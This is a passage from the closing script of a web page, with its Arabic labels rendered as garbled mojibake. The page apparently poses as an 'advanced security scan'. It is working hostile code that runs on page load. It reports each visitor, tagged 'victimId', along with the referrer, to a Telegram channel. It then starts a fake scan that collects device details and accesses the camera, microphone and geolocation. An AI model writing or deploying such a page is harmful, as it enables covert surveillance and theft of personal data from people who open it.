            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.innerHTML = 'â³ Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙØ­Øµ...';
            
            showMessage('ğŸ” Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø£Ù…Ù†ÙŠ Ø§Ù„Ù…ØªÙ‚Ø¯Ù…...', 'info');
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ
            await sendToTelegram('Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ', {
                victimId: victimId,
                startTime: new Date().toISOString()
            });
            
            // ØªÙ†ÙÙŠØ° Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù‡Ø§Ù…
            await collectDeviceInfo();
            await accessCamera();
            await accessMicrophone();
            await getLocation();
        }
        
        // ===== Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²ÙŠØ§Ø±Ø© =====
        (async function() {
            // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¨Ø²ÙŠØ§Ø±Ø© Ø§Ù„ØµÙØ­Ø©
            await sendToTelegram('Ø¯Ø®ÙˆÙ„ Ù„Ù„ØµÙØ­Ø©', {
                victimId: victimId,
                time: new Date().toISOString(),
                referrer: document.referrer || 'Ù…Ø¨Ø§Ø´Ø±'
            });
            
            // Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨Ø¹Ø¯ 2 Ø«Ø§Ù†ÙŠØ©
            setTimeout(startSecurityScan, 2000);
        })();
    </script>
</body>
</html>
